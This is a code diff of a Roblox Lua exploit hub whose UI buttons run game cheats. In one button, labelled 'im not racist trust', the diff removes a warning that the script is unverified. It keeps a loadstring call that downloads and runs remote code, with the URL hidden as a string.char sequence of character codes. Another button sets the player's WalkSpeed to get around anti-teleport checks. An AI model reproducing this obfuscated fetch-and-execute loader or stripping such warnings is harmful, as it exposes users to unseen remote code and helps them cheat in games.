@@ -787,12 +787,7 @@ local Button = Tab:Button({
     Desc = "im not racist trust",
     Locked = false,
     Callback = function()
-        --[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
---by Nothingnesser
- 
-loadstring(game:HttpGet(string.char(
+        loadstring(game:HttpGet(string.char(
 104,
 116,
 116,
@@ -971,8 +966,6 @@ local Button = SabTab:Button({
     Desc = "only use when game has anti tp",
     Locked = false,
     Callback = function()
-        
-
         -- Place this LocalScript in StarterPlayerScripts or StarterGui
 
 local player = game.Players.LocalPlayer
@@ -1031,7 +1024,5 @@ button.MouseButton1Click:Connect(function()
         player.Character.Humanoid.WalkSpeed = speed
     end
 end)
-
-    
     end
 })
